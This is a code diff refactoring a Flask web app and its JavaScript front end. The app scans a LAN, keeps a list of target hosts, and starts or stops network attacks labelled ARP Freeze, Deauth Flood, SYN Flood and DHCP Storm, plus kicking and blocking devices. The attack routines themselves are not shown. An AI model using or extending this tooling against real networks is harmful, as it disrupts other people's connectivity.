+  const banner = document.getElementById('prereq-banner');
+  const msg = document.getElementById('prereq-msg');
+  if (missing.length) {
+    banner.style.display = 'block';
+    msg.textContent = 'Missing prerequisites: ' + missing.join(', ');
+  } else {
+    banner.style.display = 'none';
+  }
+  // Also update settings display
+  document.getElementById('settings-status').textContent =
+    `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
+}
+
+// ---------- Interface selection ----------
 async function loadInterfaces() {
   const data = await apiCall('interfaces');
   const sel = document.getElementById('iface-select');
@@ -1112,32 +1320,21 @@ async function loadInterfaces() {
     if (selected) {
       sel.value = selected.name;
       await setInterface();
-      addLog(`Auto-set interface to ${selected.name}`, 'success');
+      addLog('Auto-set interface to ' + selected.name, 'success');
     } else {
       addLog('No usable network interfaces found.', 'error');
     }
   } else {
-    addLog('No network interfaces found. Please check your connection.', 'error');
+    addLog('No network interfaces found.', 'error');
   }
 }
-loadInterfaces();
 
 async function setInterface() {
   const iface = document.getElementById('iface-select').value;
-  if (!iface) {
-    showStatus('No interface selected.', false);
-    addLog('No interface selected.', 'error');
-    return;
-  }
+  if (!iface) return;
   const res = await apiCall('set_interface', 'POST', { interface: iface });
-  if (res.success) {
-    showStatus(res.status, true);
-    addLog(`Interface set to ${iface}`, 'success');
-  } else {
-    showStatus(res.status, false);
-    addLog(`Failed to set interface: ${res.status}`, 'error');
-  }
-  updateSettingsDisplay();
+  showStatus(res.status, res.success);
+  checkPrerequisites();
 }
 
 async function setGateway() {
@@ -1145,9 +1342,7 @@ async function setGateway() {
   if (!gw) return;
   const res = await apiCall('set_gateway', 'POST', { gateway: gw });
   showStatus(res.status, res.success);
-  if (res.success) addLog(`Gateway set to ${gw}`, 'success');
-  else addLog(`Failed to set gateway: ${res.status}`, 'error');
-  updateSettingsDisplay();
+  checkPrerequisites();
 }
 
 async function setPort() {
@@ -1155,33 +1350,20 @@ async function setPort() {
   if (isNaN(port) || port<1 || port>65535) return;
   const res = await apiCall('set_port', 'POST', { port });
   showStatus(res.status, res.success);
-  if (res.success) addLog(`Port set to ${port}`, 'success');
-  else addLog(`Failed to set port: ${res.status}`, 'error');
-  updateSettingsDisplay();
+  checkPrerequisites();
 }
 
-async function updateSettingsDisplay() {
-  const res = await apiCall('state');
-  const s = res.state;
-  document.getElementById('settings-status').textContent =
-    `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
-}
-updateSettingsDisplay();
-
-// ---------- hosts ----------
+// ---------- Hosts ----------
 async function refreshHosts() {
   const state = await apiCall('state');
   if (!state.state.interface) {
     showStatus('Please set an interface first in Settings.', false);
-    addLog('Cannot scan: interface not set.', 'error');
     return;
   }
   const scanBtn = document.getElementById('scan-btn');
   const spinner = document.getElementById('scan-spinner');
   scanBtn.disabled = true;
   spinner.style.display = 'inline-block';
-  showStatus('Scanning LAN...', true);
-  addLog('Starting LAN scan...', 'info');
   const res = await apiCall('scan');
   scanBtn.disabled = false;
   spinner.style.display = 'none';
@@ -1189,13 +1371,9 @@ async function refreshHosts() {
     currentHosts = res.hosts;
     renderHosts();
     showStatus('Scan complete: found ' + currentHosts.length + ' hosts', true);
-    addLog(`Scan complete: ${currentHosts.length} hosts found.`, 'success');
-    for (let h of currentHosts) {
-      checkReachability(h.ip);
-    }
+    checkPrerequisites();
   } else {
     showStatus('Scan failed: ' + res.error, false);
-    addLog('Scan failed: ' + res.error, 'error');
   }
 }
 
@@ -1205,59 +1383,79 @@ function renderHosts() {
   tbody.innerHTML = '';
   empty.style.display = currentHosts.length ? 'none' : 'block';
   currentHosts.forEach(h => {
+    const isTarget = currentTargets.includes(h.ip);
     const tr = document.createElement('tr');
     tr.id = 'host-row-' + h.ip;
     tr.innerHTML = `
-      <td>${escapeHtml(h.ip)}</td>
+      <td><input type="checkbox" class="host-check" data-ip="${h.ip}"></td>
+      <td>${escapeHtml(h.ip)}${isTarget ? '<span class="target-badge">🎯 Target</span>' : ''}</td>
       <td>${escapeHtml(h.mac)}</td>
       <td id="reach-${h.ip}"><span class="badge dim">Checking...</span></td>
       <td>
-        <button class="btn secondary" onclick="addTargetByIP('${h.ip}')">Add target</button>
+        ${isTarget 
+          ? `<button class="btn secondary" onclick="removeTargetByIP('${h.ip}')">Remove target</button>`
+          : `<button class="btn secondary" onclick="addTargetByIP('${h.ip}')">Add target</button>`}
         <button class="btn secondary" onclick="kickIP('${h.ip}')">Kick</button>
         <button class="btn secondary" onclick="toggleBlockIP('${h.ip}')">Block</button>
       </td>
     `;
     tbody.appendChild(tr);
+    // Trigger server-side reachability check
+    serverCheckReachability(h.ip);
   });
+  // Update select-all checkbox state
+  document.getElementById('select-all-hosts').checked = false;
 }
 
-async function checkReachability(ip) {
+async function serverCheckReachability(ip) {
   const cell = document.getElementById('reach-' + ip);
   if (!cell) return;
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 2500);
-  let reached = false;
-  let latency = 0;
-  const start = performance.now();
-  try {
-    await Promise.any([
-      fetch('http://' + ip + '/', { mode: 'no-cors', signal: controller.signal, cache: 'no-store' }),
-      fetch('https://' + ip + '/', { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
-    ]);
-    reached = true;
-    latency = Math.round(performance.now() - start);
-  } catch (e) {
-    reached = false;
-  } finally {
-    clearTimeout(timeout);
-    if (reached) {
-      cell.innerHTML = `<span class="badge good">Reachable (${latency}ms)</span>`;
-    } else {
-      cell.innerHTML = `<span class="badge bad">No response</span>`;
-    }
+  cell.innerHTML = '<span class="badge dim">Checking...</span>';
+  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(ip));
+  if (res.reachable) {
+    cell.innerHTML = `<span class="badge good">Reachable (${res.latency}ms)</span>`;
+  } else {
+    cell.innerHTML = `<span class="badge bad">No response</span>`;
   }
 }
 
-// ---------- targets ----------
-async function addTargetByIP(ip) {
+function toggleAllHosts() {
+  const checked = document.getElementById('select-all-hosts').checked;
+  document.querySelectorAll('.host-check').forEach(cb => cb.checked = checked);
+}
+
+function bulkAddTargets() {
+  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
+  if (!selectedIPs.length) {
+    alert('No hosts selected');
+    return;
+  }
+  Promise.all(selectedIPs.map(ip => addTargetByIP(ip, false))).then(() => {
+    loadTargets();
+    renderHosts(); // refresh target badges
+  });
+}
+
+// ---------- Targets ----------
+async function addTargetByIP(ip, refresh = true) {
   const res = await apiCall('add_target', 'POST', { ip });
   if (res.success) {
     showStatus('Added target ' + ip, true);
-    addLog(`Added target ${ip}`, 'success');
-    loadTargets();
+    if (refresh) {
+      loadTargets();
+      renderHosts();
+    }
   } else {
     showStatus('Error: ' + res.error, false);
-    addLog('Failed to add target: ' + res.error, 'error');
+  }
+}
+
+async function removeTargetByIP(ip) {
+  const res = await apiCall('remove_target', 'POST', { ip });
+  if (res.success) {
+    showStatus('Removed target ' + ip, true);
+    loadTargets();
+    renderHosts();
   }
 }
 
@@ -1268,91 +1466,82 @@ async function addTarget() {
   document.getElementById('target-ip').value = '';
 }
 
-async function removeTarget(ip) {
-  const res = await apiCall('remove_target', 'POST', { ip });
-  if (res.success) {
-    showStatus('Removed target ' + ip, true);
-    addLog(`Removed target ${ip}`, 'success');
-    loadTargets();
-  }
-}
-
 async function loadTargets() {
   const res = await apiCall('state');
-  const targets = res.state.targets || [];
+  currentTargets = res.state.targets || [];
   const tbody = document.getElementById('target-body');
   const empty = document.getElementById('target-empty');
   tbody.innerHTML = '';
-  empty.style.display = targets.length ? 'none' : 'block';
-  targets.forEach(ip => {
+  empty.style.display = currentTargets.length ? 'none' : 'block';
+  currentTargets.forEach(ip => {
     const host = currentHosts.find(h => h.ip === ip);
     const mac = host ? host.mac : '—';
     const tr = document.createElement('tr');
     tr.innerHTML = `
       <td>${escapeHtml(ip)}</td>
       <td>${escapeHtml(mac)}</td>
-      <td><button class="icon-btn" onclick="removeTarget('${ip}')">✕</button></td>
+      <td><button class="icon-btn" onclick="removeTargetByIP('${ip}')">✕</button></td>
     `;
     tbody.appendChild(tr);
   });
+  checkPrerequisites();
 }
-loadTargets();
 
-// ---------- attacks ----------
-async function startAttack() {
+// ---------- Attacks ----------
+async function confirmStartAttack() {
+  if (!confirm(`Are you sure you want to start attack weapon ${selectedWeapon}?`)) return;
   const state = await apiCall('state');
   if (!state.state.interface) {
     showStatus('Please set an interface first in Settings.', false);
-    addLog('Cannot start attack: interface not set.', 'error');
+    switchTab('settings');
     return;
   }
   if (state.running_attacks && state.running_attacks.length > 0) {
     showStatus('An attack is already running. Stop it first.', false);
-    addLog('Attack already running on server.', 'warn');
-    attackRunning = true;
-    return;
-  }
-  if (attackRunning) {
-    showStatus('Attack already running. Stop it first.', false);
-    addLog('Attempted to start attack while one is already running.', 'warn');
     return;
   }
   const btn = document.getElementById('start-btn');
   btn.disabled = true;
   btn.textContent = '⏳ Starting...';
   showStatus('Starting attack...', true);
-  addLog(`Starting attack weapon ${selectedWeapon}...`, 'info');
   const res = await apiCall('start_attack', 'POST', { weapon: selectedWeapon });
   btn.disabled = false;
   btn.textContent = '▶ Start';
   if (res.success) {
-    attackRunning = true;
     showStatus('Attack started: ' + res.weapon, true);
-    addLog(`Attack started: ${res.weapon}`, 'success');
+    pollAttackStatus();
   } else {
     showStatus('Failed: ' + res.error, false);
-    addLog('Attack start failed: ' + res.error, 'error');
   }
 }
 
-async function stopAttack() {
+async function confirmStopAttack() {
+  if (!confirm('Stop all running attacks?')) return;
   const res = await apiCall('stop_attack', 'POST');
-  attackRunning = false;
   showStatus(res.status, res.success);
-  addLog('All attacks stopped.', 'info');
+  pollAttackStatus();
 }
 
-// ---------- kick & block ----------
+// ---------- Kick & Block ----------
 async function kickIP(ip) {
+  if (!confirm(`Kick ${ip}?`)) return;
   const res = await apiCall('kick', 'POST', { ip });
   showStatus(res.status, res.success);
-  addLog(res.status, res.success ? 'success' : 'error');
+  if (res.success) {
+    addLog(res.status, 'success');
+  } else {
+    addLog(res.status, 'error');
+  }
 }
 
 async function toggleBlockIP(ip) {
   const res = await apiCall('block', 'POST', { ip });
   showStatus(res.status, res.success);
-  addLog(res.status, res.success ? 'success' : 'error');
+  if (res.success) {
+    addLog(res.status, 'success');
+  } else {
+    addLog(res.status, 'error');
+  }
 }
 
 function kickSelected() {
@@ -1365,11 +1554,7 @@ function toggleBlock() {
   if (ip) toggleBlockIP(ip);
 }
 
-// ---------- original monitoring code (unchanged) ----------
-let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
-let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
-let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');
-
+// ---------- Device Watch (server-side ping) ----------
 function renderDevices() {
   const tbody = document.querySelector('#dev-table tbody');
   const empty = document.getElementById('dev-empty');
@@ -1397,7 +1582,7 @@ function renderDevices() {
 function addDevice() {
   const name = document.getElementById('dev-name').value.trim();
   const ip = document.getElementById('dev-ip').value.trim();
-  if (!ip.match(/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/)) { alert('Enter a valid IPv4 address.'); return; }
+  if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) { alert('Enter a valid IPv4 address.'); return; }
   devices.push({ name, ip, status: null, latency: null });
   localStorage.setItem('lg_devices', JSON.stringify(devices));
   document.getElementById('dev-name').value = '';
@@ -1415,37 +1600,27 @@ async function checkDevice(i) {
   const d = devices[i];
   d.status = 'checking';
   renderDevices();
-  const start = performance.now();
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 2500);
-  let reached = false;
-  try {
-    await Promise.any([
-      fetch('http://' + d.ip + '/', { mode: 'no-cors', signal: controller.signal, cache: 'no-store' }),
-      fetch('https://' + d.ip + '/', { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
-    ]);
-    reached = true;
-    d.latency = Math.round(performance.now() - start);
+  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(d.ip));
+  if (res.reachable) {
+    d.latency = res.latency;
     d.status = 'up';
-  } catch (e) {
+  } else {
     d.status = 'down';
     d.latency = null;
-  } finally {
-    clearTimeout(timeout);
-    localStorage.setItem('lg_devices', JSON.stringify(devices));
-    renderDevices();
   }
+  localStorage.setItem('lg_devices', JSON.stringify(devices));
+  renderDevices();
 }
 
-function checkAll() {
+function checkAllDevices() {
   devices.forEach((_, i) => checkDevice(i));
 }
 
-// ---------- ARP detector (unchanged) ----------
+// ---------- ARP Detector (unchanged) ----------
 function parseArpText(text) {
   const entries = {};
-  const lines = text.split('\\n');
-  const ipRe = /(\\d{1,3}(?:\\.\\d{1,3}){3})/;
+  const lines = text.split('\n');
+  const ipRe = /(\d{1,3}(?:\.\d{1,3}){3})/;
   const macRe = /([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/;
   lines.forEach(line => {
     const ipm = line.match(ipRe);
@@ -1501,7 +1676,7 @@ function clearArpHistory() {
 function analyzeDeauth() {
   const text = document.getElementById('deauth-input').value.trim();
   if (!text) return;
-  const nums = text.split(/[\\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
+  const nums = text.split(/[\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
   if (nums.length < 3) {
     pushAlert('Need at least a few readings to detect a spike pattern.', 'warn');
     renderAlerts();
@@ -1521,7 +1696,8 @@ function pushAlert(msg, level) {
   alerts.unshift({ msg, level, time: new Date().toLocaleString() });
   alerts = alerts.slice(0, 50);
   localStorage.setItem('lg_alerts', JSON.stringify(alerts));
-  addLog(msg, level === 'bad' ? 'error' : 'warn');
+  // Also log to server (optional)
+  apiCall('add_log', 'POST', { level: level === 'bad' ? 'error' : 'warn', msg });
 }
 
 function renderAlerts() {
@@ -1537,10 +1713,19 @@ function renderAlerts() {
   });
 }
 
-// ---------- init ----------
+// ---------- Init ----------
 document.getElementById('arp-snap-count').textContent = arpHistory.length;
 renderDevices();
 renderAlerts();
+loadInterfaces();
+loadTargets();
+checkPrerequisites();
+
+// Start polling
+logPollTimer = setInterval(pollLogs, 2000);
+attackPollTimer = setInterval(pollAttackStatus, 2000);
+pollLogs();
+pollAttackStatus();
 </script>
 </body>
 </html>
@@ -1586,6 +1771,7 @@ def api_set_interface():
     if not iface:
         return jsonify({'success': False, 'status': 'No interface provided'})
     STATE['interface'] = iface
+    add_log('info', f'Interface set to {iface}')
     return jsonify({'success': True, 'status': f'Interface set to {iface}'})
 
 @app.route('/api/set_gateway', methods=['POST'])
@@ -1595,6 +1781,7 @@ def api_set_gateway():
     if not gw or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', gw):
         return jsonify({'success': False, 'status': 'Invalid IP'})
     STATE['gateway'] = gw
+    add_log('info', f'Gateway set to {gw}')
     return jsonify({'success': True, 'status': f'Gateway set to {gw}'})
 
 @app.route('/api/set_port', methods=['POST'])
@@ -1608,6 +1795,7 @@ def api_set_port():
     if port < 1 or port > 65535:
         return jsonify({'success': False, 'status': 'Invalid port'})
     STATE['port'] = port
+    add_log('info', f'Port set to {port}')
     return jsonify({'success': True, 'status': f'Port set to {port}'})
 
 @app.route('/api/state', methods=['GET'])
@@ -1634,6 +1822,7 @@ def api_scan():
         return jsonify({'success': False, 'error': 'No IP on interface'})
     hosts = arp_scan(iface, my_ip, cidr)
     STATE['hosts'] = hosts
+    add_log('info', f'ARP scan completed, found {len(hosts)} hosts')
     return jsonify({'success': True, 'hosts': hosts})
 
 @app.route('/api/add_target', methods=['POST'])
@@ -1644,6 +1833,7 @@ def api_add_target():
         return jsonify({'success': False, 'error': 'Invalid IP'})
     if ip not in STATE['targets']:
         STATE['targets'].append(ip)
+        add_log('info', f'Target added: {ip}')
     return jsonify({'success': True})
 
 @app.route('/api/remove_target', methods=['POST'])
@@ -1652,6 +1842,7 @@ def api_remove_target():
     ip = data.get('ip')
     if ip in STATE['targets']:
         STATE['targets'].remove(ip)
+        add_log('info', f'Target removed: {ip}')
     return jsonify({'success': True})
 
 @app.route('/api/start_attack', methods=['POST'])
@@ -1672,13 +1863,22 @@ def api_start_attack():
         del STATE['attack_pids'][weapon]
     try:
         pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
-        if pids:
-            STATE['attack_pids'][weapon] = pids
-            weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Monitor'}
-            return jsonify({'success': True, 'weapon': weapon_names[weapon]})
-        else:
-            return jsonify({'success': False, 'error': 'Attack launcher returned no processes'})
+        if not pids:
+            raise RuntimeError('Attack launcher returned no processes')
+        STATE['attack_pids'][weapon] = pids
+        STATE['attack_status'][weapon] = 'running'
+        weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
+        add_log('success', f'Attack started: {weapon_names[weapon]}')
+        # Schedule liveness check
+        def liveness(weapon_id, proc_list):
+            time.sleep(2)
+            if any(p.poll() is not None for p in proc_list):
+                STATE['attack_status'][weapon_id] = 'dead'
+                add_log('error', f'Attack {weapon_names[weapon_id]} died unexpectedly')
+        threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
+        return jsonify({'success': True, 'weapon': weapon_names[weapon]})
     except Exception as e:
+        add_log('error', f'Attack start failed: {str(e)}')
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/stop_attack', methods=['POST'])
@@ -1686,23 +1886,44 @@ def api_stop_attack():
     for weapon, pids in list(STATE['attack_pids'].items()):
         kill_attack(pids)
     STATE['attack_pids'].clear()
-    if 'monitor_log_path' in STATE:
+    STATE['attack_status'] = {}
+    if 'monitor_log_path' in STATE and STATE['monitor_log_path']:
         try:
             os.unlink(STATE['monitor_log_path'])
         except:
             pass
-        del STATE['monitor_log_path']
+        STATE['monitor_log_path'] = None
     if STATE['interface']:
-        try:
-            set_monitor(STATE['interface'], False)
-        except:
-            pass
+        set_monitor(STATE['interface'], False)
+    add_log('info', 'All attacks stopped')
     return jsonify({'success': True, 'status': 'All attacks stopped'})
+
+@app.route('/api/attack_status', methods=['GET'])
+def api_attack_status():
+    # Check liveness of all running attacks
+    for weapon, pids in STATE['attack_pids'].items():
+        if any(p.poll() is not None for p in pids):
+            STATE['attack_status'][weapon] = 'dead'
+        else:
+            STATE['attack_status'][weapon] = 'running'
+    # Build response: weapon_id -> true if running
+    attacks = {weapon: (STATE['attack_status'].get(weapon) == 'running') for weapon in STATE['attack_pids']}
+    return jsonify({'attacks': attacks})
 
 @app.route('/api/monitor_log', methods=['GET'])
 def api_monitor_log():
     lines = STATE.get('monitor_log', [])
     return jsonify({'lines': lines[-50:]})
+
+@app.route('/api/check_reachability', methods=['GET'])
+def api_check_reachability():
+    ip = request.args.get('ip')
+    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
+        return jsonify({'reachable': False, 'error': 'Invalid IP'})
+    start = time.time()
+    reachable = server_ping(ip)
+    latency = int((time.time() - start) * 1000) if reachable else None
+    return jsonify({'reachable': reachable, 'latency': latency})
 
 @app.route('/api/kick', methods=['POST'])
 def api_kick():
@@ -1720,9 +1941,15 @@ def api_kick():
     if not STATE['interface']:
         return jsonify({'success': False, 'status': 'Interface not set'})
     try:
-        kick_client(ip, mac, STATE['interface'])
-        return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
+        kicked = kick_client(ip, mac, STATE['interface'])
+        if kicked:
+            add_log('success', f'Kicked {ip} ({mac})')
+            return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
+        else:
+            add_log('warn', f'Kick {ip} attempted but target still responding')
+            return jsonify({'success': False, 'status': f'Kick {ip} attempted but target still responding'})
     except Exception as e:
+        add_log('error', f'Kick failed: {str(e)}')
         return jsonify({'success': False, 'status': str(e)})
 
 @app.route('/api/block', methods=['POST'])
@@ -1739,12 +1966,30 @@ def api_block():
     if not mac:
         return jsonify({'success': False, 'status': 'MAC not found'})
     try:
-        block_mac(mac)
-        blocked = mac in STATE['blocked_macs']
+        blocked = block_mac(mac)
         msg = 'Blocked' if blocked else 'Unblocked'
         return jsonify({'success': True, 'status': f'{msg} {mac}'})
     except Exception as e:
+        add_log('error', f'Block failed: {str(e)}')
         return jsonify({'success': False, 'status': str(e)})
+
+@app.route('/api/logs', methods=['GET'])
+def api_logs():
+    return jsonify({'logs': STATE['log']})
+
+@app.route('/api/clear_logs', methods=['POST'])
+def api_clear_logs():
+    STATE['log'] = []
+    add_log('info', 'Server log cleared')
+    return jsonify({'success': True})
+
+@app.route('/api/add_log', methods=['POST'])
+def api_add_log():
+    data = request.json
+    level = data.get('level', 'info')
+    msg = data.get('msg', '')
+    add_log(level, msg)
+    return jsonify({'success': True})
 
 # ---------- bootstrap ----------
 if __name__ == '__main__':
